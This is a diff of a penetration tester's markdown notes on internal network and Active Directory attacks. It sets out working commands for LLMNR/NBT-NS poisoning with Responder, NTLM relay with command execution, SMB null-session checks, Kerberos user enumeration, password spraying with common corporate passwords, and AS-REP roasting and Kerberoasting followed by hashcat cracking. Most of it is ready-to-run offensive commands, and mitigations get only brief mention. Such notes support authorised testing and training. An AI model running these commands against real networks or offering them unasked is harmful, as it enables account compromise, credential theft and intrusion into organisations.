@@ -9,7 +9,7 @@
 
 # internal methodology
 
-## host discovery:
+## host discovery
 - get internal ip ranges
     - dhcp / routing table / DNS servers
     - check ips in received packets through tcpdump / responder
@@ -18,32 +18,37 @@
     - try DNS queries using potential internal domains (ex: vpn.example.corp)
 - ?arp-scan: great to scan local networks (supposily nmap -sn already do this)
 - passive arp listener: stealthy way to discover local hosts
-- start poisoning and save ntlm responses to break:
-    responder to poison nbtns/llmnr
-    ?mitm6
-    ?arp spoofing
-- search smb targets, crackmapexec is good to check where signing is not required
-    - cme smb REDE --gen-relay-list output.txt
-    - ntlm relay
 
-## initial approach
-- first scan ports 80 and 443 (?+ 445) using full tcp handshake, just then do a complete scan
+## scanning
+- firstly, scan ports 80 and 443 (?+ 445) using full tcp handshake, after this do a complete scan
     - less noisy, avoids initial blocks
-    - can work while full scan is running
+    - allow you to work while the full scan is running
 - to discovery hosts up in a large network, it is possible to use network sweeping with nmap -sn
 - the way port scanners work, not always they found all tcp opened ports, netcat can be more accurate
-- the default nmap scan technique depends of the permissions (sS or sT)
-- search creds in smbs with open shares
+- the default nmap scan technique depends on the permissions (sS or sT)
 
-## choosing passwords
-- default AD policy: Upper && Lower && numbers && 7 characters 
-    - it can't contain the name of the user
-    - Password1, Company123
-- brazil common passwords:
-    - Company@2023, Company2023
-    - Mudar@123, Mudar123
-- generate wordlist:
-    - bopscrk
+## attacking
+- start poisoning and save ntlm responses to break:
+    * responder to poison nbtns/llmnr
+    * ?mitm6
+    * ?arp spoofing
+- search smb targets, crackmapexec is good to check where signing is not required
+    * cme smb REDE --gen-relay-list output.txt
+    * + ntlm relay saving hashes
+- look for creds in smbs with open shares
+- [AD password spraying](https://github.com/morkin1792/security-tests/edit/main/internal.md#ad-attacks)
+- check ftp anon login
+    * sudo nmap -n --script ftp-anon -p 21 -iL hosts.txt -oX ftp_results.txt
+- check nfs
+    * sudo nmap -n -Pn -p 111,2049 --script nfs-ls -iL hosts.txt -oX nfs_results.txt
+- quick ssh brute force (oracle:oracle, root:root)
+- check smb null session
+    - crackmapexec smb -u "" -p "" --local-auth --shares $(cat hosts.txt) > hosts_smb_local.txt
+    - crackmapexec smb -u "" -p "" -d DOMAIN --shares $(cat hosts.txt) > hosts_smb_domain.txt
+- check vnc cve (nmap script)
+- check old windows versions in crackmapexec output
+- if not stealth: nuclei
+- analyse web apps (printers, actuator, big ip, ...)
 
 # Windows / Active Directory
 
@@ -214,65 +219,91 @@ Convert-SidToName S-1-5-...-1104
         - mark objects as owned to filter
 
 #### AD Attacks
-- poison + ntlm relay
-    - impacket-ntlmrelayx
-        * -smb2support
-        * -t TARGET
-        * -tf TARGETSFILE          # multiple targets
-        * -of HASHFILE             # save NTLM response in a file (it automatically add the suffix _ntlm)
-        * -i                       # open smb shell locally, good if the user doesn't have admin permission, TODO: consider change by -socks option
-        * -c "powershell -enc ..." # command execution
-- user enumeration via kerberos
-    * it does not lock out the accounts
-    * `ldapnomnom -server $dcIp -input names.txt --parallel 64`
-    * `kerbrute userenum -d corp.com --dc $kdcIp usernames.txt`
-    * `nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='corp.com',userdb=/root/user.txt $kdcIp`
-- password spraying
-    - warning: **brute force can block accounts**
-        * use `net accounts` to show the lockout policies
-    - via kerberos
-        * fast
-        * `kerbrute passwordspray -d corp.com --dc $kdcIp usernames.txt "Company123!"`
-    - via smb
-        * slowest and noisy
-        * `crackmapexec smb $domainJoinedMachine -u users.txt -p 'Company123!' -d corp.com --continue-on-success`
-    - via authenticated ldap
-        * slow
-        * https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1
-        * `.\Spray-Passwords.ps1 -Pass Company123! -Admin`
-- AS-REP roasting
-    - kerberos preauthentication is the first step of the authentication process (when the client send the AS-REQ)
-    - preauthentication is enabled by default
-    - if preauthentication is disabled for an user, anyone can send an AS-REQ on behalf of this user, and get a AS-REP
-    - AS-REP contains a session key (encrypted with the user hash) and a TGT ('signed' with krbtgt hash)
-        - ?since it is required to have the session key in plaintext to generate a TGS, the TGT cannot be used to pass the ticket?
-    - However, the session key can be used as input to perform an **offline bruteforce attack**, aiming to discover the user password
-    - 1) Get the AS-REP
-        * **having a user list**
-            * impacket: `impacket-GetNPUsers -dc-ip $ip -request -outputfile asrep.hashes -usersfile users.txt corp.com/`
-        * **with credentials**
-            * powerview: `Get-DomainUser -PreauthNotRequired`
-            * rubeus: `rubeus.exe asreproast /nowrap /outfile:asrep.hashes` 
-            * impacket: `impacket-GetNPUsers -dc-ip $ip -request -outputfile asrep.hashes corp.com/knownuser`
-    - 2) Crack the hash: 
-        * `hashcat -m 18200 asrep.hashes rockyou.txt -r best64.rule`
-    - Targeted AS-REP Roasting: with GenericWrite or GenericAll permissions on another AD user account, instead of just change their passwords, it is possible to modify the User Account Control value of the user to not require Kerberos preauthentication and then do the AS-REP roasting. It should be reversed after the hash is obtained.
-    - Mitigation: Enable preauth. If it is really necessary keep it disabled, at least the affected accounts should use very strong passwords, to let password cracking attacks impracticable.
-- TGS-REP Roasting (Kerberoasting)
-    - When a domain user requests a service ticket (TGS) for any service, the KDC generates a TGS without any permissions check, because the user and group memberships are added in the TGS. 
-    - So, the service receiving the TGS ticket can check the users permissions by itself.
-    - But yet it is possible to get the TGS, and it is encrypted with the hash of the service account
-    - It allows an offline bruteforce attack be performed, known as **Kerberoasting**, but just if the service **does not** run in the context of a **machine account**, a managed service account, or a group-managed service account, where the password is randomly generated, complex, and too long to be cracked.
-    - 1) Search SPNs (accounts for service) and get TGS_REP of them
-        * impacket: `impacket-GetUserSPNs -dc-ip $ip -request -outputfile tgsrep.hashes corp.com/knownuser`
-        * rubeus: `rubeus.exe kerberoast /outfile:tgsrep.hashes`
-    - 2) Crack the hash
-        * `hashcat -m 13100 tgsrep.hashes rockyou.txt -r best64.rule`
-    - After a kerberoasting attack, create **silver tickets** can be useful
-    - Unauthenticated Kerberoasting: If there is a user with preauth disabled, it can be possible to use a list to check SPN accounts
-        - check parameter -no-preauth in GetUserSPN.py https://tools.thehacker.recipes/impacket/examples/getuserspns.py (-userfile should contain a list of accounts to be checked)
-    - targeted Kerberoasting: with GenericWrite or GenericAll permissions on another AD user account, it is possible to set an SPN for the user (setspn.exe), and then execute the kerberoasting attack. It should be reversed after the hash is obtained.
-    - Mitigation: Avoid SPNs on user acconts. If necessary, use a really strong password.
+
+##### poison (responder)
+```sh
+sudo responder -I eth0 -v # default mode, can denial very old services
+-A # analyse mode, not poisoning, no dos
+-b # basic http authentication
+-wdF # ?wpad combo
+-Pd  # ?
+-D   # ?DHCP
+--disable-ess 
+```
+
+##### poison + ntlm relay
+- impacket-ntlmrelayx
+    * -smb2support
+    * -t TARGET
+    * -tf TARGETSFILE          # multiple targets
+    * -of HASHFILE             # save NTLM response in a file (it automatically add the suffix _ntlm)
+    * -i                       # open smb shell locally, good if the user doesn't have admin permission, TODO: consider change by -socks option
+    * -c "powershell -enc ..." # command execution
+
+##### user enumeration via kerberos
+* it does not lock out the accounts
+* `ldapnomnom -server $dcIp -input names.txt --parallel 64`
+* `kerbrute userenum -d corp.com --dc $kdcIp usernames.txt`
+* `nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='corp.com',userdb=/root/user.txt $kdcIp`
+
+##### choosing password
+- default AD policy: Upper && Lower && numbers && 7 characters 
+    - it can't contain the name of the user
+    - Password1, Company123
+- brazil common passwords:
+    - Company@2023, Company2023
+    - Mudar@123, Mudar123
+- generate wordlist:
+    - bopscrk
+
+##### password spraying
+- warning: **brute force can block accounts**
+    * use `net accounts` to show the lockout policies
+- via kerberos
+    * fast
+    * `kerbrute passwordspray -d corp.com --dc $kdcIp usernames.txt "Company123!"`
+- via smb
+    * slowest and noisy
+    * `crackmapexec smb $domainJoinedMachine -u users.txt -p 'Company123!' -d corp.com --continue-on-success`
+- via authenticated ldap
+    * slow
+    * https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1
+    * `.\Spray-Passwords.ps1 -Pass Company123! -Admin`
+
+##### AS-REP roasting
+- kerberos preauthentication is the first step of the authentication process (when the client send the AS-REQ)
+- preauthentication is enabled by default
+- if preauthentication is disabled for an user, anyone can send an AS-REQ on behalf of this user, and get a AS-REP
+- AS-REP contains a session key (encrypted with the user hash) and a TGT ('signed' with krbtgt hash)
+    - ?since it is required to have the session key in plaintext to generate a TGS, the TGT cannot be used to pass the ticket?
+- However, the session key can be used as input to perform an **offline bruteforce attack**, aiming to discover the user password
+- 1) Get the AS-REP
+    * **having a user list**
+        * impacket: `impacket-GetNPUsers -dc-ip $ip -request -outputfile asrep.hashes -usersfile users.txt corp.com/`
+    * **with credentials**
+        * powerview: `Get-DomainUser -PreauthNotRequired`
+        * rubeus: `rubeus.exe asreproast /nowrap /outfile:asrep.hashes` 
+        * impacket: `impacket-GetNPUsers -dc-ip $ip -request -outputfile asrep.hashes corp.com/knownuser`
+- 2) Crack the hash: 
+    * `hashcat -m 18200 asrep.hashes rockyou.txt -r best64.rule`
+- Targeted AS-REP Roasting: with GenericWrite or GenericAll permissions on another AD user account, instead of just change their passwords, it is possible to modify the User Account Control value of the user to not require Kerberos preauthentication and then do the AS-REP roasting. It should be reversed after the hash is obtained.
+- Mitigation: Enable preauth. If it is really necessary keep it disabled, at least the affected accounts should use very strong passwords, to let password cracking attacks impracticable.
+
+##### TGS-REP Roasting (Kerberoasting)
+- When a domain user requests a service ticket (TGS) for any service, the KDC generates a TGS without any permissions check, because the user and group memberships are added in the TGS. 
+- So, the service receiving the TGS ticket can check the users permissions by itself.
+- But yet it is possible to get the TGS, and it is encrypted with the hash of the service account
+- It allows an offline bruteforce attack be performed, known as **Kerberoasting**, but just if the service **does not** run in the context of a **machine account**, a managed service account, or a group-managed service account, where the password is randomly generated, complex, and too long to be cracked.
+- 1) Search SPNs (accounts for service) and get TGS_REP of them
+    * impacket: `impacket-GetUserSPNs -dc-ip $ip -request -outputfile tgsrep.hashes corp.com/knownuser`
+    * rubeus: `rubeus.exe kerberoast /outfile:tgsrep.hashes`
+- 2) Crack the hash
+    * `hashcat -m 13100 tgsrep.hashes rockyou.txt -r best64.rule`
+- After a kerberoasting attack, create **silver tickets** can be useful
+- Unauthenticated Kerberoasting: If there is a user with preauth disabled, it can be possible to use a list to check SPN accounts
+    - check parameter -no-preauth in GetUserSPN.py https://tools.thehacker.recipes/impacket/examples/getuserspns.py (-userfile should contain a list of accounts to be checked)
+- targeted Kerberoasting: with GenericWrite or GenericAll permissions on another AD user account, it is possible to set an SPN for the user (setspn.exe), and then execute the kerberoasting attack. It should be reversed after the hash is obtained.
+- Mitigation: Avoid SPNs on user acconts. If necessary, use a really strong password.
 
 
 #### Lateral movement
